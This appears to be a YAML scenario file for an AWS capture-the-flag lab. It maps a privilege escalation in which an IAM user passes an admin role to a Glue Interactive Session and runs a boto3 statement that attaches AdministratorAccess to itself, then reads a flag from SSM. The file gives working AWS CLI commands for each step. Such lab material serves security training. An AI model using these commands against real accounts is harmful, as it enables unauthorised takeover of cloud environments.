attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-glue-007-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on a specific admin role plus glue:CreateSession
        and glue:RunStatement permissions -- enough to spin up a Glue Interactive Session
        under the admin role and execute arbitrary Python code within it.

    - id: glue-session
      label: "Glue Interactive Session"
      type: resource
      subType: glue-job
      arn: "arn:aws:glue:{region}:{account_id}:session/pl-prod-glue-007-attack-session"
      description: >
        An AWS Glue Interactive Session created with the admin role attached. The session
        provides a serverless Python (PySpark) environment where arbitrary code runs with
        the full permissions of the passed IAM role. boto3 is available by default, allowing
        direct calls to any AWS API -- including IAM -- as the admin role.

    - id: admin-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role"
      description: >
        This IAM role has AdministratorAccess and is assumed by the Glue Interactive Session
        at session startup. Any Python code executed via glue:RunStatement runs under this
        role's identity. By calling iam:AttachUserPolicy from within the session, the attacker
        grants AdministratorAccess to the starting user, completing the privilege escalation.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/glue-007-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: glue-session
      label: "iam:PassRole + glue:CreateSession"
      description: >
        The starting user passes the admin role to a new Glue Interactive Session.
        The Glue service assumes the passed role during session initialization, giving
        the session full administrative permissions accessible via boto3.
      hints:
        - "Use glue:CreateSession with the admin role ARN in --role, specifying --command type glueetl and --glue-version 4.0, then poll glue:GetSession until Status reaches READY (60-90 seconds)."
        - "Submit a Python snippet via glue:RunStatement that calls boto3 iam.attach_user_policy to attach AdministratorAccess to the starting user, then poll glue:GetStatement until State reaches AVAILABLE. After the statement completes, wait at least 15 seconds for IAM policy propagation before verifying."
        - "Browse to https://pathfinding.cloud/paths/glue-007 for full technique details."
      commands:
        - description: "Check your current identity"
          command: "aws sts get-caller-identity"
        - description: "Create a Glue Interactive Session with the admin role"
          command: >
            aws glue create-session
            --id pl-prod-glue-007-attack-session
            --role arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role
            --command '{"Name":"glueetl","PythonVersion":"3"}'
            --glue-version "4.0"
            --worker-type "G.1X"
            --number-of-workers 2
        - description: "Poll session status until READY"
          command: "aws glue get-session --id pl-prod-glue-007-attack-session --query 'Session.Status' --output text"

    - from: glue-session
      to: admin-role
      label: "glue:RunStatement + boto3 iam:AttachUserPolicy"
      description: >
        With the session running as the admin role, the attacker executes a Python statement
        using boto3 to call iam:AttachUserPolicy, attaching AdministratorAccess to the
        starting user. The Glue service makes the IAM API call on behalf of the admin role,
        completing the privilege escalation without ever directly assuming the role.
      hints: []
      commands:
        - description: "Run a Python statement to attach AdministratorAccess to the starting user"
          command: >
            aws glue run-statement
            --session-id pl-prod-glue-007-attack-session
            --code "import boto3; iam = boto3.client('iam'); iam.attach_user_policy(UserName='pl-prod-glue-007-to-admin-starting-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'); print('SUCCESS')"
        - description: "Poll statement status until AVAILABLE"
          command: "aws glue get-statement --session-id pl-prod-glue-007-attack-session --id <statement-id> --query 'Statement.State' --output text"
        - description: "Verify AdministratorAccess is attached"
          command: "aws iam list-attached-user-policies --user-name pl-prod-glue-007-to-admin-starting-user"
        - description: "Verify admin access with the starting user credentials"
          command: "aws iam list-users --max-items 3 --output table"

    - from: admin-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/glue-007-to-admin to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/glue-007-to-admin --query 'Parameter.Value' --output text"
